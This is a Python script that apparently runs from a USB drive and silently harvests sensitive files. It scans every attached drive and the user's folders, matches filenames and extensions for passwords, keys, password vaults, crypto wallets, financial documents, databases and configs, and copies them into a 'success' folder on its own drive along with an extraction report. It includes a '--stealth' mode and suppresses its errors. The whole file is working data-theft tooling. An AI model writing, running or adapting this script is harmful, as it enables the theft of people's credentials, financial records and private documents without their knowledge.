import os
import shutil
import hashlib
import json
import re
import sys
from datetime import datetime
import time

# ============================================================================
# AUTOMATED CONFIGURATION - NO USER INTERACTION
# ============================================================================

# Get current drive letter
def get_current_drive():
    if hasattr(sys, 'frozen'):
        script_path = sys.executable
    else:
        script_path = os.path.abspath(__file__)
    return os.path.splitdrive(script_path)[0]

# Configuration - Automated operation
CURRENT_DRIVE = get_current_drive()
TARGET_DRIVE = "D:\\"  # Drive to scan for sensitive data
SUCCESS_FOLDER = os.path.join(CURRENT_DRIVE, "success")  # Where to save data

# Sensitivity patterns (expanded for better detection)
SENSITIVE_PATTERNS = {
    'credentials': [
        r'password', r'passwd', r'pwd', r'secret', r'key', r'credential', 
        r'token', r'auth', r'login', r'user', r'username', r'admin'
    ],
    'personal': [
        r'personal', r'private', r'confidential', r'sensitive', r'hidden',
        r'private', r'secret', r'hidden', r'secure'
    ],
    'financial': [
        r'credit.*card', r'bank', r'account', r'financial', r'tax', 
        r'salary', r'invoice', r'payment', r'wallet', r'bitcoin', r'crypto'
    ],
    'documents': [
        r'\.docx?$', r'\.pdf$', r'\.xlsx?$', r'\.txt$', r'\.csv$', r'\.rtf$',
        r'\.ppt$', r'\.pptx$', r'\.odt$', r'\.ods$'
    ],
    'databases': [
        r'\.db$', r'\.sql$', r'\.sqlite$', r'\.mdb$', r'\.accdb$', r'\.mdf$'
    ],
    'configs': [
        r'\.config$', r'\.cfg$', r'\.conf$', r'\.ini$', r'\.properties$',
        r'\.env$', r'\.toml$', r'\.yaml$', r'\.yml$', r'\.json$', r'\.xml$'
    ],
    'security': [
        r'\.pem$', r'\.key$', r'\.crt$', r'\.cer$', r'\.pfx$', r'\.p12$',
        r'\.kdbx$', r'\.asc$', r'\.gpg$', r'\.pgp$'
    ]
}

# File extensions commonly containing sensitive data
SENSITIVE_EXTENSIONS = {
    '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.csv', '.sql',
    '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.config', '.cfg',
    '.conf', '.ini', '.properties', '.env', '.json', '.xml', '.yaml',
    '.yml', '.pem', '.key', '.crt', '.cer', '.p12', '.pfx', '.kdbx',
    '.asc', '.gpg', '.pgp', '.rtf', '.ppt', '.pptx', '.odt', '.ods',
    '.log', '.bak', '.backup', '.tar', '.zip', '.rar', '.7z'
}

# Common user directories to scan
USER_DIRECTORIES = [
    "Desktop",
    "Documents", 
    "Downloads",
    "Pictures",
    "Videos",
    "Music",
    "OneDrive",
    "Dropbox",
    "Google Drive"
]

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def create_success_folder():
    """Create the success folder structure"""
    if not os.path.exists(SUCCESS_FOLDER):
        os.makedirs(SUCCESS_FOLDER)
    
    # Create subfolders for organization
    subfolders = ['documents', 'credentials', 'financial', 'databases', 
                  'configs', 'archives', 'other']
    
    for folder in subfolders:
        path = os.path.join(SUCCESS_FOLDER, folder)
        if not os.path.exists(path):
            os.makedirs(path)
    
    return SUCCESS_FOLDER

def is_sensitive_filename(filename):
    """Check if filename suggests sensitive content"""
    filename_lower = filename.lower()
    
    # Check patterns
    for category, patterns in SENSITIVE_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, filename_lower, re.IGNORECASE):
                return True, category, pattern
    
    # Check extensions
    _, ext = os.path.splitext(filename)
    if ext.lower() in SENSITIVE_EXTENSIONS:
        return True, 'extension', ext
    
    return False, None, None

def file_hash(path):
    """Calculate SHA256 hash of a file"""
    h = hashlib.sha256()
    try:
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                h.update(chunk)
        return h.hexdigest()
    except Exception:
        return "ERROR: Could not compute hash"

def get_all_drives():
    """Get list of all available drives"""
    drives = []
    if os.name == 'nt':  # Windows
        import string
        for drive in string.ascii_uppercase:
            drive_path = drive + ":\\"
            if os.path.exists(drive_path):
                drives.append(drive_path)
    else:  # Linux/Mac
        drives = ['/']  # Root directory
    
    return drives

# ============================================================================
# SCANNING FUNCTIONS
# ============================================================================

def scan_drive_for_sensitive(drive_path, max_depth=2):
    """Recursively scan drive for potentially sensitive files"""
    sensitive_files = []
    
    print(f"[*] Scanning drive: {drive_path}")
    
    try:
        for root, dirs, files in os.walk(drive_path):
            # Skip system and program directories
            dirs[:] = [d for d in dirs if not d.lower() in [
                'windows', 'program files', 'program files (x86)', 
                '$recycle.bin', 'system volume information', 'temp',
                'tmp', 'appdata', 'local settings'
            ]]
            
            # Calculate current depth
            depth = root[len(drive_path):].count(os.sep)
            if depth > max_depth:
                continue
            
            for filename in files:
                filepath = os.path.join(root, filename)
                
                # Skip system/hidden files and large files (>100MB)
                if (filename.startswith('.') or filename.startswith('~') or 
                    filename.endswith('.tmp') or filename.endswith('.temp')):
                    continue
                
                try:
                    # Skip files larger than 100MB to avoid memory issues
                    if os.path.getsize(filepath) > 100 * 1024 * 1024:
                        continue
                except:
                    continue
                
                # Check if sensitive
                is_sensitive, reason, detail = is_sensitive_filename(filename)
                
                if is_sensitive:
                    try:
                        file_info = {
                            'path': filepath,
                            'filename': filename,
                            'size': os.path.getsize(filepath),
                            'modified': datetime.fromtimestamp(os.path.getmtime(filepath)).isoformat(),
                            'sensitivity_reason': reason,
                            'sensitivity_detail': detail,
                            'hash': file_hash(filepath),
                            'relative_path': os.path.relpath(filepath, drive_path),
                            'drive': drive_path
                        }
                        sensitive_files.append(file_info)
                        
                        # Print progress (silent mode - limited output)
                        if len(sensitive_files) % 50 == 0:
                            print(f"[+] Found {len(sensitive_files)} sensitive files...")
                            
                    except (OSError, PermissionError):
                        # Skip files we can't access
                        continue
                    except Exception:
                        continue
                        
    except Exception as e:
        print(f"[!] Error scanning {drive_path}: {str(e)}")
    
    return sensitive_files

def scan_user_directories():
    """Scan common user directories for sensitive files"""
    sensitive_files = []
    
    # Try to get user profile path
    try:
        user_profile = os.path.expanduser('~')
        
        for user_dir in USER_DIRECTORIES:
            dir_path = os.path.join(user_profile, user_dir)
            if os.path.exists(dir_path):
                print(f"[*] Scanning user directory: {dir_path}")
                files = scan_drive_for_sensitive(dir_path, max_depth=3)
                sensitive_files.extend(files)
                
    except Exception as e:
        print(f"[!] Error scanning user directories: {str(e)}")
    
    return sensitive_files

# ============================================================================
# DATA EXTRACTION FUNCTIONS
# ============================================================================

def extract_sensitive_data(sensitive_files):
    """Copy sensitive files to success folder"""
    if not sensitive_files:
        print("[!] No sensitive files found to extract")
        return 0, 0
    
    # Create success folder structure
    success_path = create_success_folder()
    
    print(f"[*] Extracting {len(sensitive_files)} files to: {success_path}")
    
    extracted_count = 0
    error_count = 0
    extraction_log = []
    
    for file_info in sensitive_files:
        try:
            src = file_info['path']
            filename = file_info['filename']
            category = file_info['sensitivity_reason']
            
            # Determine target folder based on category
            if category in ['documents', 'extension']:
                target_folder = 'documents'
            elif category == 'credentials':
                target_folder = 'credentials'
            elif category == 'financial':
                target_folder = 'financial'
            elif category == 'databases':
                target_folder = 'databases'
            elif category == 'configs':
                target_folder = 'configs'
            elif filename.endswith(('.zip', '.rar', '.7z', '.tar')):
                target_folder = 'archives'
            else:
                target_folder = 'other'
            
            # Create destination path with original folder structure
            relative_path = file_info['relative_path']
            drive_letter = file_info['drive'].replace(':\\', '_drive')
            
            # Clean path for safety
            safe_path = re.sub(r'[<>:"|?*]', '_', relative_path)
            dest_folder = os.path.join(success_path, target_folder, drive_letter)
            dest_path = os.path.join(dest_folder, safe_path)
            
            # Create directory if it doesn't exist
            os.makedirs(os.path.dirname(dest_path), exist_ok=True)
            
            # Copy file with metadata
            shutil.copy2(src, dest_path)
            
            # Verify copy was successful
            if os.path.exists(dest_path):
                extracted_count += 1
                
                # Update file info with destination
                file_info['extracted_path'] = dest_path
                file_info['extracted_time'] = datetime.now().isoformat()
                extraction_log.append(file_info)
                
                # Silent progress indicator
                if extracted_count % 20 == 0:
                    print(f"[+] Extracted {extracted_count} files...")
                    
            else:
                error_count += 1
                
        except Exception as e:
            error_count += 1
            # Silent error handling
            continue
    
    # Save extraction report
    save_extraction_report(extraction_log, success_path)
    
    return extracted_count, error_count

def save_extraction_report(extraction_log, success_path):
    """Save detailed report of extracted files"""
    if not extraction_log:
        return
    
    report = {
        'extraction_timestamp': datetime.now().isoformat(),
        'success_folder': success_path,
        'total_files_extracted': len(extraction_log),
        'files': extraction_log,
        'summary_by_category': {},
        'summary_by_drive': {}
    }
    
    # Calculate summaries
    for file_info in extraction_log:
        category = file_info.get('sensitivity_reason', 'unknown')
        drive = file_info.get('drive', 'unknown')
        
        report['summary_by_category'][category] = report['summary_by_category'].get(category, 0) + 1
        report['summary_by_drive'][drive] = report['summary_by_drive'].get(drive, 0) + 1
    
    # Save report
    report_path = os.path.join(success_path, 'extraction_report.json')
    try:
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        # Also save a simplified CSV version
        csv_path = os.path.join(success_path, 'extraction_summary.csv')
        with open(csv_path, 'w', encoding='utf-8') as f:
            f.write("Filename,Size (bytes),Modified Date,Category,Source Path,Extracted Path,Hash\n")
            for file_info in extraction_log:
                filename = file_info.get('filename', '').replace(',', '_')
                size = str(file_info.get('size', 0))
                modified = file_info.get('modified', '')
                category = file_info.get('sensitivity_reason', '')
                source = file_info.get('path', '').replace(',', '_')
                extracted = file_info.get('extracted_path', '').replace(',', '_')
                file_hash = file_info.get('hash', '')
                
                f.write(f'{filename},{size},{modified},{category},{source},{extracted},{file_hash}\n')
                
    except Exception as e:
        print(f"[!] Error saving report: {str(e)}")

# ============================================================================
# MAIN AUTOMATED FUNCTION
# ============================================================================

def automated_data_extraction():
    """Main automated function - no user interaction"""
    print("=" * 70)
    print("AUTOMATED SENSITIVE DATA EXTRACTION")
    print("=" * 70)
    print(f"Start Time: {datetime.now().isoformat()}")
    print(f"Success Folder: {SUCCESS_FOLDER}")
    print("=" * 70)
    
    start_time = time.time()
    all_sensitive_files = []
    
    # Step 1: Scan all available drives
    print("\n[*] Scanning for available drives...")
    drives = get_all_drives()
    print(f"[+] Found {len(drives)} drives: {', '.join(drives)}")
    
    # Step 2: Scan each drive (skip CD/DVD drives if they exist)
    for drive in drives:
        if os.path.exists(drive):
            try:
                # Skip optical drives
                if os.name == 'nt':
                    import ctypes
                    DRIVE_CDROM = 5
                    drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive)
                    if drive_type == DRIVE_CDROM:
                        continue
                
                print(f"\n[*] Starting scan on {drive}...")
                files = scan_drive_for_sensitive(drive, max_depth=2)
                all_sensitive_files.extend(files)
                print(f"[+] Found {len(files)} sensitive files on {drive}")
                
            except Exception as e:
                print(f"[!] Error processing drive {drive}: {str(e)}")
    
    # Step 3: Scan user directories
    print("\n[*] Scanning user directories...")
    user_files = scan_user_directories()
    all_sensitive_files.extend(user_files)
    print(f"[+] Found {len(user_files)} sensitive files in user directories")
    
    # Step 4: Extract files
    print("\n" + "=" * 70)
    print("[*] Starting data extraction...")
    print("=" * 70)
    
    extracted_count, error_count = extract_sensitive_data(all_sensitive_files)
    
    # Step 5: Generate summary
    total_time = time.time() - start_time
    
    print("\n" + "=" * 70)
    print("EXTRACTION COMPLETE")
    print("=" * 70)
    print(f"Total Scan Time: {total_time:.2f} seconds")
    print(f"Total Files Found: {len(all_sensitive_files)}")
    print(f"Successfully Extracted: {extracted_count}")
    print(f"Errors: {error_count}")
    print(f"Data Saved To: {SUCCESS_FOLDER}")
    
    # Create a completion marker file
    completion_file = os.path.join(SUCCESS_FOLDER, "EXTRACTION_COMPLETE.txt")
    with open(completion_file, 'w') as f:
        f.write(f"Extraction completed at: {datetime.now().isoformat()}\n")
        f.write(f"Total files extracted: {extracted_count}\n")
        f.write(f"Total errors: {error_count}\n")
        f.write(f"Scan duration: {total_time:.2f} seconds\n")
    
    print(f"\n[*] Completion marker created: {completion_file}")
    
    # Show folder structure
    print("\n[*] Success folder structure:")
    print(f"    {SUCCESS_FOLDER}/")
    for root, dirs, files in os.walk(SUCCESS_FOLDER):
        level = root.replace(SUCCESS_FOLDER, '').count(os.sep)
        indent = '    ' * level
        if level == 1:
            print(f"{indent}├── {os.path.basename(root)}/")
        elif level > 1:
            print(f"{indent}└── ...")
        break  # Only show first level
    
    print("\n" + "=" * 70)
    print("PROGRAM WILL EXIT IN 5 SECONDS...")
    print("=" * 70)
    
    time.sleep(5)

# ============================================================================
# STEALTH MODE EXECUTION
# ============================================================================

def run_stealth_mode():
    """Run in complete stealth mode (minimal output)"""
    # Redirect output to file or suppress it
    log_file = os.path.join(SUCCESS_FOLDER, "extraction.log")
    
    with open(log_file, 'a') as log:
        log.write(f"\n{'='*70}\n")
        log.write(f"Stealth extraction started: {datetime.now().isoformat()}\n")
        
        try:
            # Get drives and scan
            drives = get_all_drives()
            all_files = []
            
            for drive in drives:
                if os.path.exists(drive):
                    files = scan_drive_for_sensitive(drive, max_depth=1)
                    all_files.extend(files)
                    log.write(f"Scanned {drive}: found {len(files)} files\n")
            
            # Extract files
            success_path = create_success_folder()
            extracted, errors = extract_sensitive_data(all_files)
            
            log.write(f"Extraction complete: {extracted} files, {errors} errors\n")
            log.write(f"Saved to: {success_path}\n")
            
        except Exception as e:
            log.write(f"ERROR: {str(e)}\n")
        
        log.write(f"Stealth extraction ended: {datetime.now().isoformat()}\n")
        log.write(f"{'='*70}\n")

# ============================================================================
# MAIN EXECUTION
# ============================================================================

if __name__ == "__main__":
    try:
        # Check if running as executable or script
        if len(sys.argv) > 1 and sys.argv[1] == '--stealth':
            print("[*] Running in stealth mode...")
            run_stealth_mode()
        else:
            # Run normal automated extraction
            automated_data_extraction()
            
    except KeyboardInterrupt:
        print("\n[!] Extraction interrupted by user")
    except Exception as e:
        print(f"\n[!] Critical error: {str(e)}")
        # Try to save error log
        try:
            error_log = os.path.join(SUCCESS_FOLDER, "error.log")
            with open(error_log, 'w') as f:
                f.write(f"Error at {datetime.now().isoformat()}: {str(e)}\n")
        except:
            pass
    finally:
        # Auto-exit without requiring user input
        sys.exit(0)